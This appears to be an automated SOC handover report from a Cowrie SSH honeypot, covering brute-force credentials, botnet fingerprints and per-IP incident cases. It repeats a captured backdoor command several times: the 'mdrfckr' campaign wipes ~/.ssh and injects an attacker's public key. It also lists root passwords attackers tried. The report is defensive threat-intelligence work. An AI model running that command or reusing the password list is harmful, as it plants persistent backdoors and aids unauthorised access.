# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-05-19 |
| **Generated At** | 2026-05-19T07:52:28Z |
| **Shift Time** | 07:52 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · AWS EC2 · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **224** |
| Confirmed Threats | **208** |
| False Positives Filtered | **16** (7.1%) |
| Unique Attacker IPs | **32** |
| Countries of Origin | **14** |
| High Severity Cases | **41** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **183** |
| Malware Samples Analyzed | **0** HIGH · **16** MED · 4 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **95** |
| Unique Credential Pairs | **51** |
| Unique Usernames | **25** |
| Unique Passwords | **49** |
| Successful Auth Pairs | **32** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 41 |
| `345gs5662d34` | 19 |
| `admin` | 4 |
| `GET / HTTP/1.1` | 3 |
| `User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36` | 3 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `345gs5662d34` | 19 |
| `3245gs5662d34` | 19 |
| `admin` | 3 |
| `Host: 13.235.92.17:23` | 3 |
| `Accept-Encoding: gzip` | 3 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `345gs5662d34` | `345gs5662d34` | 19 |
| `root` | `3245gs5662d34` | 19 |
| `GET / HTTP/1.1` | `Host: 13.235.92.17:23` | 3 |
| `User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36` | `Accept-Encoding: gzip` | 3 |
| `*1` | `$4` | 3 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `root` | `123456.a` | `45.147.249.81` | 2026-05-19T03:56:00 |
| `root` | `3245gs5662d34` | `45.147.249.81` | 2026-05-19T03:56:04 |
| `root` | `admin` | `171.231.180.120` | 2026-05-19T04:18:40 |
| `root` | `validator` | `14.63.196.175` | 2026-05-19T04:18:54 |
| `root` | `3245gs5662d34` | `14.63.196.175` | 2026-05-19T04:18:57 |
| `root` | `@` | `171.231.189.104` | 2026-05-19T04:21:49 |
| `root` | `password` | `116.99.174.106` | 2026-05-19T04:35:39 |
| `root` | `aA123456` | `34.71.30.159` | 2026-05-19T06:52:45 |
| `root` | `3245gs5662d34` | `34.71.30.159` | 2026-05-19T06:52:50 |
| `root` | `michelle` | `103.211.59.6` | 2026-05-19T06:59:21 |
| `root` | `3245gs5662d34` | `103.211.59.6` | 2026-05-19T06:59:23 |
| `root` | `pass2word` | `197.243.0.62` | 2026-05-19T06:59:40 |
| `root` | `3245gs5662d34` | `197.243.0.62` | 2026-05-19T06:59:46 |
| `root` | `P@$$w0rd123` | `103.117.56.120` | 2026-05-19T07:00:31 |
| `root` | `3245gs5662d34` | `103.117.56.120` | 2026-05-19T07:00:34 |
| `root` | `data` | `160.251.169.213` | 2026-05-19T07:02:53 |
| `root` | `3245gs5662d34` | `160.251.169.213` | 2026-05-19T07:02:57 |
| `root` | `toor` | `115.241.83.2` | 2026-05-19T07:05:29 |
| `root` | `3245gs5662d34` | `115.241.83.2` | 2026-05-19T07:05:30 |
| `root` | `Bismillah@123` | `115.241.83.2` | 2026-05-19T07:06:58 |
| `root` | `Admin*2025` | `115.241.83.2` | 2026-05-19T07:10:07 |
| `root` | `Design@123` | `115.241.83.2` | 2026-05-19T07:13:02 |
| `root` | `root123456789` | `115.241.83.2` | 2026-05-19T07:15:55 |
| `root` | `naomi` | `62.133.60.87` | 2026-05-19T07:17:38 |
| `root` | `3245gs5662d34` | `62.133.60.87` | 2026-05-19T07:17:41 |
| `root` | `Huawei2023` | `115.241.83.2` | 2026-05-19T07:18:45 |
| `root` | `aapje123` | `103.147.159.91` | 2026-05-19T07:19:39 |
| `root` | `3245gs5662d34` | `103.147.159.91` | 2026-05-19T07:19:42 |
| `root` | `Qweasd123.` | `115.241.83.2` | 2026-05-19T07:20:08 |
| `root` | `000000` | `115.241.83.2` | 2026-05-19T07:21:33 |
| `root` | `Admin112233` | `115.241.83.2` | 2026-05-19T07:25:56 |
| `root` | `123412` | `115.241.83.2` | 2026-05-19T07:27:28 |

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **224** |
| Sessions with Fingerprint | **7** |
| Unique HASSH Fingerprints | **7** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| libssh | 71 |
| AsyncSSH (Python) | 12 |
| Go SSH scanner | 4 |
| Unknown | 1 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `f555226df196...` | Mirai/variant | 64 | 10 |
| `fda360b1b4f4...` | Mirai/variant | 12 | 3 |
| `03a80b21afa8...` | Modern SSH client | 7 | 3 |
| `084386fa7ae5...` | Mirai/variant | 2 | 2 |
| `f1e5e9d24e5e...` | Mirai/variant | 1 | 1 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `f555226df196...` | libssh | 64 | 10 | Mirai/variant |
| `fda360b1b4f4...` | AsyncSSH (Python) | 12 | 3 | Mirai/variant |
| `03a80b21afa8...` | libssh | 7 | 3 | Modern SSH client |
| `084386fa7ae5...` | Go SSH scanner | 2 | 2 | Mirai/variant |
| `f1e5e9d24e5e...` | Go SSH scanner | 1 | 1 | Mirai/variant |
| `4e066189c3bb...` | Unknown | 1 | 1 | Generic scanner |
| `dde267e50f82...` | Go SSH scanner | 1 | 1 | Mirai/variant |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **1** |
| Campaign Clusters | **1** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 19 | 10 | `T1021.004, T1078, T1070, T1140` |

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `34.71.30.159`, `103.147.159.91`, `45.147.249.81`, `62.133.60.87`, `197.243.0.62`, `160.251.169.213`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **32** |
| Unique ASNs | **25** |
| High-Risk ASNs | **16** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS396982` | Google LLC | 5 | HIGH |
| `AS4811` | China Telecom (Group) | 2 | HIGH |
| `AS16509` | Amazon.com, Inc. | 2 | HIGH |
| `AS7552` | Viettel Group | 2 | HIGH |
| `AS4837` | CHINA UNICOM China169 Backbone | 1 | LOW |
| `AS55836` | Reliance Jio Infocomm Limited | 1 | HIGH |
| `AS10796` | Charter Communications Inc | 1 | HIGH |
| `AS264800` | TECHTRON ARGENTINA S.A. | 1 | MEDIUM |

---

---

## 🚨 Priority Cases — Immediate Attention (35)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-3ca535be1acf

| Field | Detail |
|---|---|
| **Source IP** | `45.147.249[.]81` |
| **First Seen** | 2026-05-19 03:56 |
| **Last Seen** | 2026-05-19 03:56 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-19 03:56:00` | `cowrie.session.connect` |
| `2026-05-19 03:56:00` | `cowrie.client.version` |
| `2026-05-19 03:56:00` | `cowrie.client.kex` |
| `2026-05-19 03:56:00` | `cowrie.login.success` |
| `2026-05-19 03:56:01` | `cowrie.session.params` |
| `2026-05-19 03:56:01` | `cowrie.command.input` |
| `2026-05-19 03:56:01` | `cowrie.command.failed` |
| `2026-05-19 03:56:01` | `cowrie.log.closed` |
| `2026-05-19 03:56:01` | `cowrie.session.params` |
| `2026-05-19 03:56:01` | `cowrie.command.input` |
| `2026-05-19 03:56:01` | `cowrie.session.file_download` |
| `2026-05-19 03:56:01` | `cowrie.log.closed` |
| `2026-05-19 03:56:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.147.249[.]81` to AbuseIPDB if not already reported
- [ ] Block `45.147.249[.]81` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-75fdb848bbbb

| Field | Detail |
|---|---|
| **Source IP** | `45.147.249[.]81` |
| **First Seen** | 2026-05-19 03:56 |
| **Last Seen** | 2026-05-19 03:56 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-19 03:56:03` | `cowrie.session.connect` |
| `2026-05-19 03:56:03` | `cowrie.client.version` |
| `2026-05-19 03:56:04` | `cowrie.client.kex` |
| `2026-05-19 03:56:04` | `cowrie.login.success` |
| `2026-05-19 03:56:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.147.249[.]81` to AbuseIPDB if not already reported
- [ ] Block `45.147.249[.]81` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4475757f2693

| Field | Detail |
|---|---|
| **Source IP** | `171.231.180[.]120` |
| **First Seen** | 2026-05-19 04:18 |
| **Last Seen** | 2026-05-19 04:18 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-19 04:18:39` | `cowrie.session.connect` |
| `2026-05-19 04:18:39` | `cowrie.client.version` |
| `2026-05-19 04:18:39` | `cowrie.client.kex` |
| `2026-05-19 04:18:40` | `cowrie.login.success` |
| `2026-05-19 04:18:40` | `cowrie.direct-tcpip.request` |
| `2026-05-19 04:18:40` | `cowrie.direct-tcpip.ja4h` |
| `2026-05-19 04:18:40` | `cowrie.direct-tcpip.data` |
| `2026-05-19 04:18:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `171.231.180[.]120` to AbuseIPDB if not already reported
- [ ] Block `171.231.180[.]120` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9a83eac9a9e3

| Field | Detail |
|---|---|
| **Source IP** | `171.231.189[.]104` |
| **First Seen** | 2026-05-19 04:21 |
| **Last Seen** | 2026-05-19 04:21 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-19 04:21:48` | `cowrie.session.connect` |
| `2026-05-19 04:21:48` | `cowrie.client.version` |
| `2026-05-19 04:21:48` | `cowrie.client.kex` |
| `2026-05-19 04:21:49` | `cowrie.login.success` |
| `2026-05-19 04:21:49` | `cowrie.direct-tcpip.request` |
| `2026-05-19 04:21:49` | `cowrie.direct-tcpip.ja4h` |
| `2026-05-19 04:21:49` | `cowrie.direct-tcpip.data` |
| `2026-05-19 04:21:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `171.231.189[.]104` to AbuseIPDB if not already reported
- [ ] Block `171.231.189[.]104` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-839fde1e57b9

| Field | Detail |
|---|---|
| **Source IP** | `116.99.174[.]106` |
| **First Seen** | 2026-05-19 04:35 |
| **Last Seen** | 2026-05-19 04:35 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-19 04:35:38` | `cowrie.session.connect` |
| `2026-05-19 04:35:38` | `cowrie.client.version` |
| `2026-05-19 04:35:38` | `cowrie.client.kex` |
| `2026-05-19 04:35:39` | `cowrie.login.success` |
| `2026-05-19 04:35:39` | `cowrie.direct-tcpip.request` |
| `2026-05-19 04:35:40` | `cowrie.direct-tcpip.ja4h` |
| `2026-05-19 04:35:40` | `cowrie.direct-tcpip.data` |
| `2026-05-19 04:35:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `116.99.174[.]106` to AbuseIPDB if not already reported
- [ ] Block `116.99.174[.]106` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a3801d1c1735

| Field | Detail |
|---|---|
| **Source IP** | `34.71.30[.]159` |
| **First Seen** | 2026-05-19 06:52 |
| **Last Seen** | 2026-05-19 06:52 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-19 06:52:43` | `cowrie.session.connect` |
| `2026-05-19 06:52:43` | `cowrie.client.version` |
| `2026-05-19 06:52:44` | `cowrie.client.kex` |
| `2026-05-19 06:52:45` | `cowrie.login.success` |
| `2026-05-19 06:52:45` | `cowrie.session.params` |
| `2026-05-19 06:52:45` | `cowrie.command.input` |
| `2026-05-19 06:52:45` | `cowrie.command.failed` |
| `2026-05-19 06:52:46` | `cowrie.log.closed` |
| `2026-05-19 06:52:46` | `cowrie.session.params` |
| `2026-05-19 06:52:46` | `cowrie.command.input` |
| `2026-05-19 06:52:46` | `cowrie.session.file_download` |
| `2026-05-19 06:52:46` | `cowrie.log.closed` |
| `2026-05-19 06:52:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.71.30[.]159` to AbuseIPDB if not already reported
- [ ] Block `34.71.30[.]159` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e625ee98a81c

| Field | Detail |
|---|---|
| **Source IP** | `34.71.30[.]159` |
| **First Seen** | 2026-05-19 06:52 |
| **Last Seen** | 2026-05-19 06:52 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-19 06:52:49` | `cowrie.session.connect` |
| `2026-05-19 06:52:49` | `cowrie.client.version` |
| `2026-05-19 06:52:49` | `cowrie.client.kex` |
| `2026-05-19 06:52:50` | `cowrie.login.success` |
| `2026-05-19 06:52:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.71.30[.]159` to AbuseIPDB if not already reported
- [ ] Block `34.71.30[.]159` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-66f71d00e750

| Field | Detail |
|---|---|
| **Source IP** | `197.243.0[.]62` |
| **First Seen** | 2026-05-19 06:59 |
| **Last Seen** | 2026-05-19 06:59 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-19 06:59:39` | `cowrie.session.connect` |
| `2026-05-19 06:59:39` | `cowrie.client.version` |
| `2026-05-19 06:59:39` | `cowrie.client.kex` |
| `2026-05-19 06:59:40` | `cowrie.login.success` |
| `2026-05-19 06:59:41` | `cowrie.session.params` |
| `2026-05-19 06:59:41` | `cowrie.command.input` |
| `2026-05-19 06:59:41` | `cowrie.command.failed` |
| `2026-05-19 06:59:41` | `cowrie.log.closed` |
| `2026-05-19 06:59:42` | `cowrie.session.params` |
| `2026-05-19 06:59:42` | `cowrie.command.input` |
| `2026-05-19 06:59:42` | `cowrie.session.file_download` |
| `2026-05-19 06:59:42` | `cowrie.log.closed` |
| `2026-05-19 06:59:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `197.243.0[.]62` to AbuseIPDB if not already reported
- [ ] Block `197.243.0[.]62` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9775834a4be3

| Field | Detail |
|---|---|
| **Source IP** | `197.243.0[.]62` |
| **First Seen** | 2026-05-19 06:59 |
| **Last Seen** | 2026-05-19 06:59 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-19 06:59:45` | `cowrie.session.connect` |
| `2026-05-19 06:59:45` | `cowrie.client.version` |
| `2026-05-19 06:59:45` | `cowrie.client.kex` |
| `2026-05-19 06:59:46` | `cowrie.login.success` |
| `2026-05-19 06:59:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `197.243.0[.]62` to AbuseIPDB if not already reported
- [ ] Block `197.243.0[.]62` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-90e0c620a15e

| Field | Detail |
|---|---|
| **Source IP** | `103.117.56[.]120` |
| **First Seen** | 2026-05-19 07:00 |
| **Last Seen** | 2026-05-19 07:00 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-19 07:00:31` | `cowrie.session.connect` |
| `2026-05-19 07:00:31` | `cowrie.client.version` |
| `2026-05-19 07:00:31` | `cowrie.client.kex` |
| `2026-05-19 07:00:31` | `cowrie.login.success` |
| `2026-05-19 07:00:32` | `cowrie.session.params` |
| `2026-05-19 07:00:32` | `cowrie.command.input` |
| `2026-05-19 07:00:32` | `cowrie.command.failed` |
| `2026-05-19 07:00:32` | `cowrie.log.closed` |
| `2026-05-19 07:00:32` | `cowrie.session.params` |
| `2026-05-19 07:00:32` | `cowrie.command.input` |
| `2026-05-19 07:00:32` | `cowrie.session.file_download` |
| `2026-05-19 07:00:32` | `cowrie.log.closed` |
| `2026-05-19 07:00:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.117.56[.]120` to AbuseIPDB if not already reported
- [ ] Block `103.117.56[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5f2c537b3b2b

| Field | Detail |
|---|---|
| **Source IP** | `103.117.56[.]120` |
| **First Seen** | 2026-05-19 07:00 |
| **Last Seen** | 2026-05-19 07:00 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-19 07:00:34` | `cowrie.session.connect` |
| `2026-05-19 07:00:34` | `cowrie.client.version` |
| `2026-05-19 07:00:34` | `cowrie.client.kex` |
| `2026-05-19 07:00:34` | `cowrie.login.success` |
| `2026-05-19 07:00:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.117.56[.]120` to AbuseIPDB if not already reported
- [ ] Block `103.117.56[.]120` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b52da96aafa0

| Field | Detail |
|---|---|
| **Source IP** | `160.251.169[.]213` |
| **First Seen** | 2026-05-19 07:02 |
| **Last Seen** | 2026-05-19 07:02 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-19 07:02:52` | `cowrie.session.connect` |
| `2026-05-19 07:02:52` | `cowrie.client.version` |
| `2026-05-19 07:02:53` | `cowrie.client.kex` |
| `2026-05-19 07:02:53` | `cowrie.login.success` |
| `2026-05-19 07:02:54` | `cowrie.session.params` |
| `2026-05-19 07:02:54` | `cowrie.command.input` |
| `2026-05-19 07:02:54` | `cowrie.command.failed` |
| `2026-05-19 07:02:54` | `cowrie.log.closed` |
| `2026-05-19 07:02:54` | `cowrie.session.params` |
| `2026-05-19 07:02:54` | `cowrie.command.input` |
| `2026-05-19 07:02:54` | `cowrie.session.file_download` |
| `2026-05-19 07:02:54` | `cowrie.log.closed` |
| `2026-05-19 07:02:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `160.251.169[.]213` to AbuseIPDB if not already reported
- [ ] Block `160.251.169[.]213` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2e1f904a4507

| Field | Detail |
|---|---|
| **Source IP** | `160.251.169[.]213` |
| **First Seen** | 2026-05-19 07:02 |
| **Last Seen** | 2026-05-19 07:02 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-19 07:02:56` | `cowrie.session.connect` |
| `2026-05-19 07:02:56` | `cowrie.client.version` |
| `2026-05-19 07:02:57` | `cowrie.client.kex` |
| `2026-05-19 07:02:57` | `cowrie.login.success` |
| `2026-05-19 07:02:57` | `cowrie.session.closed` |

**Recommended Actions:**
